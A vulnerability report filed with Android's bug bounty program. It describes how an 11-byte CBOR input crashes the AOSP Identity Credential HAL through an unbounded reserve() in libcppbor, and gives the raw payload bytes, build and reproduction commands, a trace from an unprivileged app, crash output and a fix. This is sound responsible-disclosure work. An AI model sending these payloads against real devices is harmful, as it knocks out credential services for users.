Your Report

Report description

Unprivileged Android app can abort the Identity Credential HAL with an 11-byte binder payload: unbounded reserve() in libcppbor throws std::bad_alloc, and AOSP builds -fno-exceptions.

Bug location

Where do you want to report your vulnerability?

Android & Devices VRP – Report security issues affecting Pixel, Smart Home, Google Nest, Home APIs, Pixel Watch, and Fitbit devices and their latest operating systems. See program rules

Which URL (or repository) have you found the vulnerability in?

https://android.googlesource.com/platform/external/libcppbor/ (src/cppbor_parse.cpp)

The problem

Please describe the technical details of the vulnerability

cppbor::parse() in AOSP libcppbor can be made to attempt a ~9.8 exabyte allocation by a 10-11 byte input. The allocation fails, and the resulting std::bad_alloc propagates out of parse().

Reproducers (raw bytes):

map_huge_count.cbor    bb 08000000 00000000 00 00     (11 bytes)
array_huge_count.cbor  9b 08000000 00000000 00        (10 bytes)
Each is a CBOR map/array header declaring 2^59 entries followed by one real element. That one element is what calls add(), and add() is what calls reserve(2^59) -- before handleEntries() has looked far enough ahead to notice the input is only 11 bytes long.

Against a plain (no-sanitizer) build of pristine libcppbor at b1b998b:

$ ./check map_huge_count.cbor
input: 11 bytes
EXCEPTION ESCAPED cppbor::parse: St9bad_alloc: std::bad_alloc

$ ./check array_huge_count.cbor
input: 10 bytes
EXCEPTION ESCAPED cppbor::parse: St9bad_alloc: std::bad_alloc
Under ASan the requested size is visible: allocation size 0x88000b100005a000.

This is a contract violation as well as a crash. cppbor_parse.h documents failures as being returned in the ParseResult error string and does not mention exceptions anywhere, so callers have no reason to wrap parse() in a try/catch. AOSP native code is built -fno-exceptions, where an uncaught std::bad_alloc becomes std::terminate() -- an immediate abort with no opportunity to handle it.

Impact is denial of service only. No out-of-bounds read or write is involved.

Reachability (full line-numbered trace in the attached REACHABILITY.md):

app (appdomain) sepolicy private/app.te:170 use_credstore(...) -> android.security.identity public/service.te:29 app_api_service ICredential.getEntries(requestMessage) ICredential.aidl:55 -> credstore Credential.cpp:245 -> :479 forwarded verbatim, unparsed -> IdentityCredential.cpp:275 startRetrieval :495 cppbor::parse(itemsRequest) first op on the buffer -> cppbor_parse.cpp:125/:142 mEntries.reserve(mSize) -> std::bad_alloc, uncaught -> -fno-exceptions (build/soong/cc/config/global.go:131) => SIGABRT

No try/catch exists in hardware/interfaces/identity/aidl/default/common/, in system/security/identity/*.cpp, or in external/libcppbor/src/.

Built the way AOSP builds it (pristine libcppbor at HEAD b1b998b, -fno-exceptions, no try/catch — see build_noexc.sh and check_noexc.cpp):

$ ./check_noexc map_huge_count.cbor
input: 11 bytes
libc++abi: terminating due to uncaught exception of type std::bad_alloc
exit status: 134            # 128 + SIGABRT
The same binary against the patched library returns "Not enough entries for map." and exits 0.

Impact analysis

Any normal installed app. No permission, no user interaction, no prior state.

SELinux permits it: system/sepolicy/private/app.te:170 applies use_credstore() to appdomain (excluding isolated, instant and SDK-sandbox apps), and system/sepolicy/public/service.te:29 marks credstore_service an app_api_service. The macro at public/te_macros:717 grants binder_call(app, credstore).

The app calls ICredential.getEntries(requestMessage, ...) with 11 bytes of hostile CBOR. credstore forwards requestMessage to the HAL verbatim without parsing it (Credential.cpp:245 -> :479). The HAL calls cppbor::parse on it as the first operation (IdentityCredential.cpp:495), before any reader-signature check. The resulting std::bad_alloc is uncaught, and because AOSP compiles with -fno-exceptions it becomes std::terminate() — SIGABRT of the HAL process, not a recoverable error.

Second attacker for the same code path: in the mDL flow itemsRequest legitimately originates from the READER device over NFC/BLE, and holder apps are expected to forward it. A holder app that passes reader bytes through — the documented pattern — extends this to an unauthenticated proximity attacker.

Limits I want to be explicit about: the HAL side I traced is the AOSP default implementation (android.hardware.identity-service.example). Vendors may host the identity HAL in a secure element with different parsing code, and I have not verified any specific shipping device. Impact is denial of service only — no out-of-bounds access, no memory corruption, no information disclosure. The HAL is respawned by init, so absent a restart loop this is a temporary DoS. I'm not proposing a severity; I'd rather give you the trace and let triage rate it.

The cause

Please specify the steps to reproduce the issue, including sample code where appropriate. Please be as detailed as possible.

All work is source-level against public AOSP repositories. No device required; none used -- see the build fingerprint field.

Get a PRISTINE libcppbor.
git clone https://android.googlesource.com/platform/external/libcppbor
cd libcppbor
export LIBCPPBOR=$PWD
git log -1 --format=%h                        # b1b998b -- the HEAD I tested
grep -n 'reserve(mSize)' src/cppbor_parse.cpp # MUST print lines 125 and 142
If that grep prints nothing the tree is already patched and nothing below reproduces.

Generate the inputs (both attached; mkrepro.py rebuilds them byte for byte).
python3 mkrepro.py
  map_huge_count.cbor    bb 08 00 00 00 00 00 00 00 00 00   11 bytes
  array_huge_count.cbor  9b 08 00 00 00 00 00 00 00 00      10 bytes
0xbb / 0x9b are map / array headers with an 8-byte count field. Each declares 2^59 entries and is followed by one real element.

Library level, exceptions ON -- std::bad_alloc escapes parse().
clang++ -std=c++20 -O1 -g -Wno-deprecated-declarations \
    -I"$LIBCPPBOR/include/cppbor" -Istubs \
    "$LIBCPPBOR/src/cppbor.cpp" "$LIBCPPBOR/src/cppbor_parse.cpp" \
    check.cpp -lcrypto -o check
./check map_huge_count.cbor
./check array_huge_count.cbor
The way AOSP builds it -- -fno-exceptions, no try/catch. This is the step that turns a throw into a process abort.
sh build_noexc.sh "$LIBCPPBOR"
./check_noexc map_huge_count.cbor   ; echo "exit $?"
./check_noexc array_huge_count.cbor ; echo "exit $?"
check_noexc.cpp has no try/catch, mirroring IdentityCredential::startRetrieval (IdentityCredential.cpp:495), which has none either.

Confirm the fix.
cd "$LIBCPPBOR" && git apply /path/to/0001-libcppbor-bound-preallocation.patch
Rebuild step 4: both inputs now exit 0 with err="Not enough entries for map." / "... for array."

Reaching it from an unprivileged app (line-numbered trace in REACHABILITY.md):

app (appdomain)              sepolicy private/app.te:170  use_credstore(...)
 -> android.security.identity public/service.te:29  app_api_service
    ICredential.getEntries(requestMessage)          ICredential.aidl:55
 -> credstore Credential.cpp:245 -> :479            forwarded verbatim, unparsed
 -> IdentityCredential.cpp:275 startRetrieval
    :495 cppbor::parse(itemsRequest)                first op on the buffer
 -> cppbor_parse.cpp:125 / :142  mEntries.reserve(mSize)
 -> std::bad_alloc, uncaught
 -> -fno-exceptions (build/soong/cc/config/global.go:131) => SIGABRT
That chain was traced through shallow clones of hardware/interfaces, system/security, system/sepolicy and build/soong. It was not executed on a device. No try/catch exists anywhere on it.

Specify the build fingerprint from the device used to reproduce the issue. The issue should reproduce on a recent build (within the last 30 days).

Not applicable, and I would rather say so than paste a fingerprint that implies a device repro I did not do. This is a bug in AOSP library source, reproduced by compiling that source: external/libcppbor at b1b998b (2024-02-15), unmodified host macOS 15.7.9, x86-64, Apple clang 17.0.0 flags -std=c++20 -O1 -g -fno-exceptions (mirrors AOSP commonGlobalCflags) Reachability was traced through public source of hardware/interfaces, system/security, system/sepolicy and build/soong — read, not executed. The only Android device available to me is a moto g power 5G (2024) on the 2024-11-01 patch level, which is neither a Google device nor a recent build, so running it there would not have satisfied this field either. If you want an on-device demonstration — an APK calling ICredential.getEntries with these 11 bytes on a current Pixel build — I will produce one on request.

Provide crash artifacts including stack trace (if available).

Plain build, exceptions on, no sanitizer:

$ ./check map_huge_count.cbor
input: 11 bytes
EXCEPTION ESCAPED cppbor::parse: St9bad_alloc: std::bad_alloc

$ ./check array_huge_count.cbor
input: 10 bytes
EXCEPTION ESCAPED cppbor::parse: St9bad_alloc: std::bad_alloc
Built as AOSP builds it (-fno-exceptions, no try/catch), pristine b1b998b:

$ ./check_noexc map_huge_count.cbor
input: 11 bytes
libc++abi: terminating due to uncaught exception of type std::bad_alloc: std::bad_alloc
exit status: 134                  # 128 + SIGABRT
Under ASan the requested size is visible:

allocation size 0x88000b100005a000 exceeds maximum supported size
= 9,799,844,952,505,950,208 bytes (~9.8 EB)
Throwing site:

std::vector<std::unique_ptr<cppbor::Item>>::reserve(mSize)
  external/libcppbor/src/cppbor_parse.cpp:125   IncompleteArray::add()
  external/libcppbor/src/cppbor_parse.cpp:142   IncompleteMap::add()
<- handleEntries() <- parseRecursively() <- cppbor::parse()
Same binary against the patched library: map_huge_count.cbor -> err=Not enough entries for map. exit 0 array_huge_count.cbor -> err=Not enough entries for array. exit 0

HWASan output (if available)

None. HWASan requires an Android target and this was reproduced as a host build, so there is no HWASan run to report.

It would also show nothing useful: the allocation never succeeds, so there is no out-of-bounds access, no use-after-free and no tag mismatch for HWASan to catch. The failure is a large allocation request being refused and the resulting std::bad_alloc going uncaught. ASan output is in the crash artifacts field above.

Does anyone else know about this vulnerability?

No, this vulnerability is private.

Do you plan to disclose this vulnerability publicly?

No, I am only notifying Google

How would you like to be publicly acknowledged for your report?

Akira Patafio
